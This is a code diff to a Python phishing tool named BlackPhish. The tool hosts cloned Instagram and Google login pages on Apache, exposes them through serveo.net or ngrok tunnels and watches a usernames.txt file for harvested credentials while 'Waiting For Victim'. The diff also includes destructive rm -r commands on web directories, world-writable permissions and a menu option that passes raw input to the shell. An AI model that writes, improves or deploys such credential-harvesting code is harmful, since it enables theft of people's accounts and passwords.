@@ -7,16 +7,16 @@
 
 # Libraries #
 try:
-    import os
+    from os import system, getcwd, geteuid
     from time import sleep
-    import socket
+    from socket import create_connection
     from distutils.dir_util import copy_tree
 except ImportError:
     print("\033[31;1m" + "[!] Import Error, Aborting! \033[0m")
     exit(1)
 
 # Variables #
-cwd = os.getcwd()
+cwd = getcwd()
 
 # COLORS #
 red = "\033[91;1m"
@@ -30,13 +30,13 @@ white = "\033[97;1m"
 blink = "\033[5m"
 
 # Check for root #
-if os.geteuid() != 0:
+if geteuid() != 0:
     exit(red + "[!] Please run as root" + reset)
 
 def checkInternet():
     print(yellow + "[*] Checking connection...")
     try:
-        socket.create_connection(("www.google.com", 80))
+        create_connection(("www.google.com", 80))
         print(green + "[+] Internet Found")
         sleep(2)
     except OSError:
@@ -45,7 +45,10 @@ def checkInternet():
     
 # Port forward to serveo #
 def serveoForward():
-    os.system('ssh -o ServerAliveInterval=3000 -R inc0gnit0:80:localhost:80 serveo.net')
+    system('ssh -o ServerAliveInterval=60 -R inc0gnit0:80:localhost:80 serveo.net')
+    
+def ngrokForward():
+    system('./ngrok http 80')
 
 # Banner #
 def banner():
@@ -100,81 +103,107 @@ def banner():
     
 def endMessage():
     print("\n")
-    print(red + "  Thank you using BlackPhish\n")
-    print(red + "  If you have any problems while using BlackPhish please report it to us\n")
-    print(red + "  Make Pull Request to support this tool\n")
+    print(yellow + "  Thank you using BlackPhish\n")
+    print(yellow + "  If you have any problems while using BlackPhish please report it to us\n")
+    print(yellow + "  Make Pull Request to support this tool\n")
     print("\n" + reset)
     exit(0)
 
 # Main Script #
 def main():
-    os.system("clear")
+    system("clear")
     
     checkInternet()
 
-    os.system('clear') # clear #
+    system('clear') # clear #
     banner() # Load Banner #
     choice = input(red + "        [BlackPhish] -> ") # Get user input #
 
     # Host Instagram Page #
     if choice == "1":
+        system("clear")
         print(green + '[+] Copying Files')
+        sleep(0.1)
         print(green + '[+] Cleaning /var/www/html/')
-        os.system('rm -r /var/www/html/ && mkdir /var/www/html/')
-        os.system('cp '+'-r '+ cwd  + '/Websites/Instagram/Instagram-Login/index.html' " /var/www/html/")
-        print(green + '[+] Starting Apache2 Service')
-        os.system('service apache2 start')
-        print(green + '[+] Apache2 Service Started')
-        serveoForward()
-        print(green + '[+] Serveo is working')
-        print(green + '[+] Done')
-        main()
-        
-    # Host Google Page #
-    elif choice == '2':
-        print(green + '[+] Copying Files')
-        print(green + '[+] Cleaning /var/www/html/')
-        os.system('rm -r /var/www/html/ && mkdir /var/www/html/')
+        sleep(0.1)
+        system('rm -r /var/www/html/ && mkdir /var/www/html/')
         print(green + '[+] Cleaning /Server/www/')
-        os.system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www")
-        copy_tree("Websites/Google", "Server/www")
+        sleep(0.1)
+        system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www")
+        copy_tree("Websites/Instagram", "Server/www")
         copy_tree("Server/www", "/var/www/html")
         print(green + '[+] Coping to /var/www/html')
-        os.system("chmod -R 777 /var/www/html")
+        sleep(0.1)
+        system("chmod -R 777 /var/www/html")
         print(green + '[+] Changing File Permissions')
+        sleep(0.1)
         print(green + '[+] Starting Apache2 Service')
-        os.system('service apache2 start')
+        sleep(0.1)
+        system('service apache2 start')
         print(green + '[+] Apache2 Service Started')
+        sleep(0.1)
         print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
+        sleep(0.1)
         while True:
             with open('/var/www/html/usernames.txt') as creds:
                 lines = creds.read().rstrip()
                 if len(lines) != 0:
                     print(green + "______________________________________________________________________________\n")
-                    print('\n                CREDENTIALS FOUND\n')
-                    os.system("cat /var/www/html/usernames.txt")
+                    print('\n                CREDENTIALS FOUND\n\n')
+                    system("cat /var/www/html/usernames.txt")
                     print("\n______________________________________________________________________________" + reset)
                     endMessage()
-                    
-        print(green + '[+] Serveo is working')
-        print(green + '[+] Done')
-        main()
+        
+    # Host Google Page #
+    elif choice == '2':
+        system("clear")
+        print(green + '[+] Copying Files')
+        sleep(0.1)
+        print(green + '[+] Cleaning /var/www/html/')
+        sleep(0.1)
+        system('rm -r /var/www/html/ && mkdir /var/www/html/')
+        print(green + '[+] Cleaning /Server/www/')
+        sleep(0.1)
+        system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www")
+        copy_tree("Websites/Google", "Server/www")
+        copy_tree("Server/www", "/var/www/html")
+        print(green + '[+] Coping to /var/www/html')
+        sleep(0.1)
+        system("chmod -R 777 /var/www/html")
+        print(green + '[+] Changing File Permissions')
+        sleep(0.1)
+        print(green + '[+] Starting Apache2 Service')
+        sleep(0.1)
+        system('service apache2 start')
+        print(green + '[+] Apache2 Service Started')
+        sleep(0.1)
+        print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
+        sleep(0.1)
+        while True:
+            with open('/var/www/html/usernames.txt') as creds:
+                lines = creds.read().rstrip()
+                if len(lines) != 0:
+                    print(green + "______________________________________________________________________________\n")
+                    print('\n                CREDENTIALS FOUND\n\n')
+                    system("cat /var/www/html/usernames.txt")
+                    print("\n______________________________________________________________________________" + reset)
+                    endMessage()
 
     # Clear #
     elif choice == "clear":
-        os.system('clear')
+        system('clear')
         main()
 
     # Clean out everything #
     elif choice == "clean":
         print(green + '[+] Stopping Apache2 Service')
-        os.system('service apache2 stop')
+        system('service apache2 stop')
         print(green + '[+] Stopping Traffic forwarding to serveo')
-        os.system('pkill -f inc0gnit0:80:localhost:80')
+        system('pkill -f inc0gnit0:80:localhost:80')
         print(green + '[+] Cleaning /var/www/html/')
-        os.system('rm -r /var/www/html/ && mkdir /var/www/html')
+        system('rm -r /var/www/html/ && mkdir /var/www/html')
         print(green + '[+] Cleaning /Server/www/')
-        os.system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www")
+        system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www")
         print(green + '[+] Done')
         main()
     
@@ -185,7 +214,7 @@ def main():
     
     # Use shell #
     elif choice != "":
-        os.system(""+choice)
+        system(""+choice)
         main()
 
     # Invalid Option Error #
